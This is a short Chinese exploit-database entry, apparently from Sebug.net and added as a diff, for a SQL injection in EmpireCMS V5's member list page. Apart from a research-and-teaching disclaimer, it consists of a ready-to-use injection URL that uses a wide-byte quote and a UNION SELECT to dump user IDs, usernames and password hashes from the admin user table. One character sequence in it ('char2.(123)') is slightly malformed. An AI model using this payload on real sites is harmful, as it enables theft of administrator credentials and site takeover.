@@ -1,0 +1,6 @@
+国ECMS V5 e-member-list-index.php注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1./e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char2.(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser/*
